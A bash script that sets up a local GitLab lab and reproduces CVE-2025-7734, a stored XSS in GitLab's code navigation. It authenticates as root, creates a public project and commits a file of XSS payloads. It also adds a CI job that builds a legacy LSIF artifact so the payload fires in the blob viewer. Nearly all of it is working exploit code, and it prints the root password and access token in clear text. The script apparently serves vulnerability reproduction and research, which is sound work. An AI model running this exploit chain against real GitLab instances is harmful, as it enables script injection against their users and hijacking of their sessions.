#!/bin/bash
# setup-gitlab.sh â€” Initialize GitLab for CVE-2025-7734 PoC
# Run this after GitLab is fully healthy.
#
# Usage: ./setup-gitlab.sh <GITLAB_URL> [ROOT_PASSWORD]
# Example: ./setup-gitlab.sh http://localhost:8880 LabPass2025!

set -euo pipefail

GITLAB_URL="${1:?Usage: $0 <GITLAB_URL> [ROOT_PASSWORD]}"
ROOT_PASSWORD="${2:-LabPass2025!}"
PROJECT_NAME="xss-poc"
BRANCH="main"

echo "=== GitLab CVE-2025-7734 Lab Setup ==="
echo "GitLab URL: ${GITLAB_URL}"

# Step 1: Get root access token via OAuth
echo "[1/5] Obtaining root access token..."
TOKEN_RESPONSE=$(curl -sf --max-time 30 "${GITLAB_URL}/oauth/token" \
  -d "grant_type=password&username=root&password=${ROOT_PASSWORD}" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null) || {
    echo "ERROR: Failed to authenticate. Is GitLab ready? URL: ${GITLAB_URL}"
    echo "Trying personal access token creation via rails console..."
    exit 1
}
ACCESS_TOKEN=$(echo "$TOKEN_RESPONSE" | jq -r '.access_token')
echo "  Got access token: ${ACCESS_TOKEN:0:10}..."

# Step 2: Create project
echo "[2/5] Creating project '${PROJECT_NAME}'..."
PROJECT_RESPONSE=$(curl -sf --max-time 30 "${GITLAB_URL}/api/v4/projects" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -d "name=${PROJECT_NAME}&initialize_with_readme=true&visibility=public" 2>/dev/null)
PROJECT_ID=$(echo "$PROJECT_RESPONSE" | jq -r '.id')
echo "  Project created: ID=${PROJECT_ID}"

# Step 3: Create the XSS payload file
echo "[3/5] Creating payload file..."
PAYLOAD_CONTENT=$(cat <<'PYEOF'
# payload.py - CVE-2025-7734 PoC
# This file contains an XSS payload that triggers via GitLab's code navigation feature
# when a legacy LSIF artifact (without end_line) is present.

variable = "<img/src/onerror=alert(document.domain)>"
another = "<svg/onload=alert('XSS-CVE-2025-7734')>"
PYEOF
)

# Base64 encode the content for the API
PAYLOAD_B64=$(echo "$PAYLOAD_CONTENT" | base64 -w0)

curl -sf --max-time 30 "${GITLAB_URL}/api/v4/projects/${PROJECT_ID}/repository/files/payload.py" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{
    \"branch\": \"${BRANCH}\",
    \"content\": $(echo "$PAYLOAD_CONTENT" | jq -Rs .),
    \"commit_message\": \"Add payload file for code navigation test\"
  }" > /dev/null
echo "  payload.py created"

# Step 4: Create .gitlab-ci.yml for LSIF artifact generation
echo "[4/5] Creating .gitlab-ci.yml with LSIF job..."
CI_CONFIG=$(cat <<'CIEOF'
code_navigation:
  image: alpine:3.18
  script:
    - mkdir -p lsif
    - |
      cat > lsif/payload.py.json << 'EOF'
      [
        {
          "start_line": 4,
          "start_char": 0,
          "hover": {
            "language": "python",
            "value": "variable: str"
          }
        },
        {
          "start_line": 5,
          "start_char": 0,
          "hover": {
            "language": "python",
            "value": "another: str"
          }
        }
      ]
      EOF
  artifacts:
    reports:
      lsif: lsif/payload.py.json
CIEOF
)

curl -sf --max-time 30 "${GITLAB_URL}/api/v4/projects/${PROJECT_ID}/repository/files/.gitlab-ci.yml" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{
    \"branch\": \"${BRANCH}\",
    \"content\": $(echo "$CI_CONFIG" | jq -Rs .),
    \"commit_message\": \"Add code navigation CI job\"
  }" > /dev/null
echo "  .gitlab-ci.yml created"

# Step 5: Summary
echo "[5/5] Setup complete!"
echo ""
echo "=== Lab Details ==="
echo "GitLab URL:     ${GITLAB_URL}"
echo "Username:       root"
echo "Password:       ${ROOT_PASSWORD}"
echo "Access Token:   ${ACCESS_TOKEN}"
echo "Project ID:     ${PROJECT_ID}"
echo "Project URL:    ${GITLAB_URL}/root/${PROJECT_NAME}"
echo "Payload File:   ${GITLAB_URL}/root/${PROJECT_NAME}/-/blob/${BRANCH}/payload.py"
echo ""
echo "=== Next Steps ==="
echo "1. Wait for the CI pipeline to complete (creates the LSIF artifact)"
echo "2. Navigate to the payload file in the blob viewer"
echo "3. The XSS should trigger when code navigation loads the legacy LSIF data"
echo ""
echo "=== Manual LSIF Upload (if CI runners unavailable) ==="
echo "The PoC agent may need to upload the LSIF artifact directly via the API."
echo "See the vulnerability analysis for LSIF format details."
